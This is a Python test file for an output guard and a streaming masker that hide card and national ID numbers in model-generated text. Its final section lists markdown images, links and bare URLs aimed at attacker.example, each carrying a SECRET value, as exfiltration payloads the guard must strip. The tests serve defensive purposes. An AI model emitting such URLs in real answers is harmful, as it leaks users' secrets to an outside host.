import random

import pytest

from security.output_guard import clean_final_answer
from security.stream_masker import StreamMasker, mask_sensitive_text


def stream(fragments: list[str]) -> str:
    masker = StreamMasker()
    shown_text = "".join(masker.feed(fragment) for fragment in fragments)
    return shown_text + masker.flush()


@pytest.mark.parametrize(
    ("raw_text", "masked_text"),
    [
        ("Card 4111111111111111 used", "Card **** **** **** 1111 used"),
        ("Card 4111 1111 1111 1111 used", "Card **** **** **** 1111 used"),
        ("Card 4111-1111-1111-1111 used", "Card **** **** **** 1111 used"),
        ("NIC 199012345678 used", "NIC ********5678 used"),
        ("NIC 901234567V used", "NIC ******567V used"),
    ],
)
def test_sensitive_numbers_are_masked(raw_text, masked_text):
    assert mask_sensitive_text(raw_text) == masked_text


@pytest.mark.parametrize(
    "harmless_text",
    [
        "The outage on 2026-10-30 lasted 240 minutes.",
        "Between 2026-01-15 2026-02-03 there were 42000 failures.",
        "Error ERR-PAY-5041 was logged.",
        "Call 0112345678 for help.",
    ],
)
def test_ordinary_numbers_are_left_alone(harmless_text):
    assert mask_sensitive_text(harmless_text) == harmless_text


def test_a_card_number_split_across_tokens_never_appears():
    # Rule 9: each fragment looks harmless alone, so masking per token would leak the number.
    fragments = ["Your card ", "4111", " 1111 ", "1111", " 1111", " is valid"]

    shown_text = stream(fragments)

    assert shown_text == "Your card **** **** **** 1111 is valid"


def test_no_partial_digits_escape_before_the_number_is_complete():
    masker = StreamMasker()

    shown_while_streaming = masker.feed("NIC 1990") + masker.feed("1234")

    assert "1990" not in shown_while_streaming


def test_a_national_id_split_across_tokens_is_masked():
    assert stream(["NIC 19901", "2345", "678 is on file"]) == "NIC ********5678 is on file"


def test_a_national_id_with_a_letter_split_from_its_digits_is_masked():
    assert stream(["NIC 901234567", "V today"]) == "NIC ******567V today"


def test_a_number_at_the_end_of_the_stream_is_masked_on_flush():
    assert stream(["Card 4111111111111111"]) == "Card **** **** **** 1111"


def test_plain_text_passes_through_unchanged():
    assert stream(["Certificate ", "expiry caused ", "the outage."]) == (
        "Certificate expiry caused the outage."
    )


@pytest.mark.parametrize(
    "disguised_number",
    [
        "4111.1111.1111.1111",
        "4111/1111/1111/1111",
        "4111_1111_1111_1111",
        "4111\t1111\t1111\t1111",
        "4111  1111  1111  1111",
        "4111\u00a01111\u00a01111\u00a01111",
        "4111\u202f1111\u202f1111\u202f1111",
        "4111\u20131111\u20131111\u20131111",
        "4111\u20111111\u20111111\u20111111",
        "4111\u200b1111\u200b1111\u200b1111",
        "4111**1111**1111**1111",
        "41111111111111111111",
        "PAN4111111111111111",
    ],
)
def test_a_card_number_cannot_hide_behind_separators(disguised_number):
    assert "4111 1111" not in mask_sensitive_text(disguised_number).replace("*", " ")
    assert mask_sensitive_text(disguised_number).endswith("1111")
    assert "11111111" not in mask_sensitive_text(disguised_number)


@pytest.mark.parametrize(
    ("raw_text", "visible_digits"),
    [("3782 822463 10005", "0005"), ("3056 930902 5904", "5904")],
)
def test_other_card_layouts_are_masked(raw_text, visible_digits):
    masked_text = mask_sensitive_text(raw_text)

    assert masked_text == f"**** **** **** {visible_digits}"


@pytest.mark.parametrize(
    "national_id", ["1990 1234 5678", "901 234 567V", "901234567 V", "901234567-V"]
)
def test_spaced_national_ids_are_masked(national_id):
    masked_text = mask_sensitive_text(national_id)

    assert "1234" not in masked_text
    assert "234 " not in masked_text


def test_a_neighbouring_ticket_number_does_not_expose_more_digits():
    # The match must not shift, or the middle of the card number would stay visible.
    masked_text = mask_sensitive_text("Ticket 1234 4539 1488 0343 6467")

    assert "0343" not in masked_text
    assert "1488" not in masked_text


def test_draft_and_final_mask_the_same_way_for_any_token_split():
    # Rule 9: however a model splits its tokens, the draft must match the masked final text.
    random_source = random.Random(9)
    texts = [
        "Card 4111 1111 1111 1111 was used on 2026-10-30.",
        "NIC 199012345678 and 901234567V are on file, see step 3.",
        "Ticket 1234 4539 1488 0343 6467 needs review.",
        "Between 2026-01-15 2026-02-03 there were 42000 failures.",
    ]
    for text in texts:
        expected_text = mask_sensitive_text(text)
        for _ in range(300):
            cut_points = sorted(random_source.sample(range(1, len(text)), 6))
            edges = [0, *cut_points, len(text)]
            fragments = [text[start:end] for start, end in zip(edges, edges[1:], strict=False)]

            assert stream(fragments) == expected_text


@pytest.mark.parametrize(
    "attack",
    [
        "See ![status](https://attacker.example/collect?data=SECRET) now",
        # A crafted image that an image pattern alone would rebuild into a live one.
        "!![x](y)(https://attacker.example/c?d=SECRET)",
        "![a[b]c](https://attacker.example/c?d=SECRET)",
        "![a][r]\n\n[r]: https://attacker.example/c?d=SECRET",
        "[Open the runbook](https://attacker.example/c?d=SECRET)",
        "<https://attacker.example/c?d=SECRET>",
        "Visit https://attacker.example/c?d=SECRET today",
        "Visit HTTPS://ATTACKER.EXAMPLE/c?d=SECRET today",
        "![x](//attacker.example/c?d=SECRET)",
        "www.attacker.example/c?d=SECRET",
    ],
)
def test_no_form_of_outside_address_survives_in_a_final_answer(attack):
    # Exfiltration: an image loads with no click, and a link needs only one.
    cleaned_answer = clean_final_answer(attack).lower()

    assert "attacker.example" not in cleaned_answer
    assert "secret" not in cleaned_answer


def test_no_markdown_image_syntax_survives():
    assert "![" not in clean_final_answer("![r][] and ![r] and ![a\\]b](x)").replace("!\\[", "")


def test_a_link_keeps_its_readable_text():
    assert clean_final_answer("[Open the runbook](https://example.com/x)") == "Open the runbook"


def test_ordinary_answers_are_unchanged():
    answer = "**Cause:** an expired certificate [1]. See RB-001 > Procedure."

    assert clean_final_answer(answer) == answer
